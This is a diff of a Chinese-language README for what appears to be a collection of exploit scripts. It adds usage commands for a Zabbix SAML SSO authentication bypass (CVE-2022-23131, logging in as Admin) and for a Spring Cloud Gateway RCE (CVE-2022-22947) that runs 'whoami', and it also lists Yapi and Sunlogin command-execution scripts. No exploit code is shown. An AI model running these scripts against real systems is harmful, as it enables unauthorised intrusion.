@@ -3,8 +3,15 @@
 
 ```
 Yapi远程命令执行漏洞.py
-CVE-2022-23131 Zabbix SAML SSO认证绕过     CVE-2022-23131.py
+
 ```
+
+## CVE-2022-23131 Zabbix SAML SSO认证绕过     CVE-2022-23131.py
+python3 CVE-2022-23131.py -u http://127.0.0.1 -a Admin
+![image](https://user-images.githubusercontent.com/33044636/156746852-69ffce94-4d5b-4cea-bfe5-688304ec08aa.png)
+
+
+
 ## 向日葵存在命令执行漏洞(CNVD-2022-10270)     sunlogin_rce.py
 
 ## 验证
@@ -19,6 +26,8 @@ python3 sunlogin_rce.py
 ## Spring Cloud Gateway 远程代码执行漏洞       CVE-2022-22947.py
 
 ### 单个验证
+
+具体的参数请看使用说明 `python3 CVE-2022-22947.py -h`
 
 ```
 python3 CVE-2022-22947.py -u http://10.108.0.52:8080 -x whoami
